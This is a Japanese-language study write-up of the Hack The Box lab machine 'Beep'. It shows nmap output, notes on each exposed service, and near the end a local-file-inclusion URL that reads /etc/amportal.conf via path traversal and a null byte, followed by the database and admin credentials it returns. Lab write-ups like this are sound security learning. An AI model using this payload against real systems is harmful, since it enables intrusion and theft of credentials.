1.nmap

```

Nmap scan report for Bep.htb (10.10.10.7)
Host is up (0.24s latency).
Not shown: 19984 closed ports
PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 4.3 (protocol 2.0)
| ssh-hostkey: 
|   1024 ad:ee:5a:bb:69:37:fb:27:af:b8:30:72:a0:f9:6f:53 (DSA)
|_  2048 bc:c6:73:59:13:a1:8a:4b:55:07:50:f6:65:1d:6d:0d (RSA)
25/tcp    open  smtp       Postfix smtpd
|_smtp-commands: beep.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, ENHANCEDSTATUSCODES, 8BITMIME, DSN, 
80/tcp    open  http       Apache httpd 2.2.3
|_http-server-header: Apache/2.2.3 (CentOS)
|_http-title: Did not follow redirect to https://Bep.htb/
110/tcp   open  pop3       Cyrus pop3d 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
|_pop3-capabilities: IMPLEMENTATION(Cyrus POP3 server v2) USER LOGIN-DELAY(0) RESP-CODES EXPIRE(NEVER) STLS TOP PIPELINING AUTH-RESP-CODE UIDL APOP
111/tcp   open  rpcbind    2 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2            111/tcp   rpcbind
|   100000  2            111/udp   rpcbind
|   100024  1            875/udp   status
|_  100024  1            878/tcp   status
143/tcp   open  imap       Cyrus imapd 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
|_imap-capabilities: Completed BINARY UIDPLUS IDLE LISTEXT RENAME CATENATE UNSELECT URLAUTHA0001 X-NETSCAPE ID LIST-SUBSCRIBED MAILBOX-REFERRALS CONDSTORE QUOTA OK SORT=MODSEQ ATOMIC NAMESPACE IMAP4rev1 SORT MULTIAPPEND ANNOTATEMORE RIGHTS=kxte IMAP4 LITERAL+ CHILDREN THREAD=REFERENCES ACL STARTTLS THREAD=ORDEREDSUBJECT NO
443/tcp   open  ssl/http   Apache httpd 2.2.3 ((CentOS))
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Apache/2.2.3 (CentOS)
|_http-title: Elastix - Login page
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2017-04-07T08:22:08
|_Not valid after:  2018-04-07T08:22:08
|_ssl-date: 2022-04-22T15:35:52+00:00; 0s from scanner time.
878/tcp   open  status     1 (RPC #100024)
993/tcp   open  ssl/imap   Cyrus imapd
|_imap-capabilities: CAPABILITY
995/tcp   open  pop3       Cyrus pop3d
3306/tcp  open  mysql      MySQL (unauthorized)
|_ssl-cert: ERROR: Script execution failed (use -d to debug)
|_ssl-date: ERROR: Script execution failed (use -d to debug)
|_sslv2: ERROR: Script execution failed (use -d to debug)
|_tls-alpn: ERROR: Script execution failed (use -d to debug)
|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)
4190/tcp  open  sieve      Cyrus timsieved 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4 (included w/cyrus imap)
4445/tcp  open  upnotifyp?
4559/tcp  open  hylafax    HylaFAX 4.3.10
5038/tcp  open  asterisk   Asterisk Call Manager 1.1
10000/tcp open  http       MiniServ 1.570 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
Service Info: Hosts:  beep.localdomain, 127.0.0.1, example.com, localhost; OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1000.22 seconds

```

```
22/tcp    open  ssh        OpenSSH 4.3 (protocol 2.0)
| ssh-hostkey: 
|   1024 ad:ee:5a:bb:69:37:fb:27:af:b8:30:72:a0:f9:6f:53 (DSA)
|_  2048 bc:c6:73:59:13:a1:8a:4b:55:07:50:f6:65:1d:6d:0d (RSA)
```
 sshポート、IDとPWの組み合わせでブルートフォースも可能だが、せめてユーザ名は特定しておきたい


```
80/tcp    open  http       Apache httpd 2.2.3
|_http-server-header: Apache/2.2.3 (CentOS)
|_http-title: Did not follow redirect to https://Bep.htb/
443/tcp   open  ssl/http   Apache httpd 2.2.3 ((CentOS))
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Apache/2.2.3 (CentOS)
|_http-title: Elastix - Login page
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2017-04-07T08:22:08
|_Not valid after:  2018-04-07T08:22:08
|_ssl-date: 2022-04-22T15:35:52+00:00; 0s from scanner time.
10000/tcp open  http       MiniServ 1.570 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
Service Info: Hosts:  beep.localdomain, 127.0.0.1, example.com, localhost; OS: Unix
```
　Web用ポート　Apache2.2.3を使用
　10000ポートには見慣れないMiniservというものがある　Webmin？
  Elastix：
　>Elastixは、AsteriskベースのPBXに使いやすいインターフェースを付加するためにベストなツール群を統合化したアプライアンスソフトウェアです。また、オープンソースのテレフォニーのためのベストなソフトウェアパッケージとするために、独自のユーティリティの設定も追加されています。
　引用元：https://ja.osdn.net/projects/sfnet_elastix/
  
  --->LFIの脆弱性情報あり
  
  参考：php/webapps/37637.pl
  
  Webmin：
  >WebminはWebベースのUnix用システム管理ツールです
  引用元：https://www.lac.co.jp/lacwatch/alert/20050920_000090.html
  　デフォルトのID/PWの組み合わせはなさそう
 
 　
```
25/tcp    open  smtp       Postfix smtpd
|_smtp-commands: beep.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, ENHANCEDSTATUSCODES, 8BITMIME, DSN, 
110/tcp   open  pop3       Cyrus pop3d 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
|_pop3-capabilities: IMPLEMENTATION(Cyrus POP3 server v2) USER LOGIN-DELAY(0) RESP-CODES EXPIRE(NEVER) STLS TOP PIPELINING AUTH-RESP-CODE UIDL APOP
143/tcp   open  imap       Cyrus imapd 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
|_imap-capabilities: Completed BINARY UIDPLUS IDLE LISTEXT RENAME CATENATE UNSELECT URLAUTHA0001 X-NETSCAPE ID LIST-SUBSCRIBED MAILBOX-REFERRALS CONDSTORE QUOTA OK SORT=MODSEQ ATOMIC NAMESPACE IMAP4rev1 SORT MULTIAPPEND ANNOTATEMORE RIGHTS=kxte IMAP4 LITERAL+ CHILDREN THREAD=REFERENCES ACL STARTTLS THREAD=ORDEREDSUBJECT NO
993/tcp   open  ssl/imap   Cyrus imapd
|_imap-capabilities: CAPABILITY
995/tcp   open  pop3       Cyrus pop3d
4190/tcp  open  sieve      Cyrus timsieved 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4 (included w/cyrus imap)
``` 
　nmptポート　snmtp-commandsというものを発行している
　要調査
　pop3ポート　Cyrus
　参考：https://atmarkit.itmedia.co.jp/ait/articles/0203/30/news001.html
　参考：http://linux.kororo.jp/cont/server/smtp_auth.php（PostFixとSMTPの関係）
 

```
111/tcp   open  rpcbind    2 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2            111/tcp   rpcbind
|   100000  2            111/udp   rpcbind
|   100024  1            875/udp   status
|_  100024  1            878/tcp   status
```
　rcpbindポート
　参考：https://www.mtioutput.com/entry/2019/01/24/090000

```
878/tcp   open  status     1 (RPC #100024)
```
??

```
3306/tcp  open  mysql      MySQL (unauthorized)
|_ssl-cert: ERROR: Script execution failed (use -d to debug)
|_ssl-date: ERROR: Script execution failed (use -d to debug)
|_sslv2: ERROR: Script execution failed (use -d to debug)
|_tls-alpn: ERROR: Script execution failed (use -d to debug)
|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)
```
 SQL
 
4445/tcp  open  upnotifyp?

```
4559/tcp  open  hylafax    HylaFAX 4.3.10
```

＞HylaFAX はファクシミリを送受信したり英数字のページを送信するためのエンタープライズクラスのシステムです。
参考：https://wiki.archlinux.jp/index.php/Hylafax

```
5038/tcp  open  asterisk   Asterisk Call Manager 1.1
```

＞Asterisk(アスタリスク)は、オープンソースのIP-PBXソフトウェアです
参考：https://www.ossnews.jp/oss_info/asterisk



-------------------------------------------------
一部WriteUpを確認-------------------------https://qiita.com/wacker22/items/21d68f183641ca35186f

LFIにてconfigデータを取得
view-source:https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action
???なぜこのファイルを取得したか

クレデンシャル情報は以下
AMPDBHOST=localhost
AMPDBENGINE=mysql
# AMPDBNAME=asterisk
AMPDBUSER=asteriskuser
# AMPDBPASS=amp109
AMPDBPASS=jEhdIekWmdjE
AMPENGINE=asterisk
AMPMGRUSER=admin
#AMPMGRPASS=amp111
AMPMGRPASS=jEhdIekWmdjE




